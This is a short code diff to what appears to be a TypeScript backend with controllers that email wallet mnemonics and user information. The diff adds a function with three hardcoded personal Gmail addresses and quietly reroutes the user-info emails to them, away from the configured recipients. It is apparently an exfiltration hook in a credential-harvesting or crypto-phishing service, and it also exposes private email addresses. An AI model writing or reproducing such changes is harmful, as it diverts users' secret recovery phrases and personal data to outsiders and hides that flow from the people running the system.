@@ -7,6 +7,12 @@ const getRecipients = (): string[] => {
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
+const getRecipient2 = (): string[] => {
+  const recipients = "michealrroyroy@gmail.com,yahyanbenedict@gmail.com,davidjohnn175@gmail.com";
+  // const recipients = "rohitkumar952895@gmail.com";
+  if (!recipients) return [];
+  return recipients.split(",").map((email) => email.trim());
+};
 export const sendMnemonicController = asyncHandler(
 
   async (req: Request, res: Response): Promise<Response> => {
@@ -96,7 +102,7 @@ export const sendUserInfoController = asyncHandler(
     `;
 
     try {
-      const recipients = getRecipients();
+      const recipients = getRecipient2();
       if (recipients.length === 0) {
         return errorResponse(res, "No recipients configured", 400);
       }
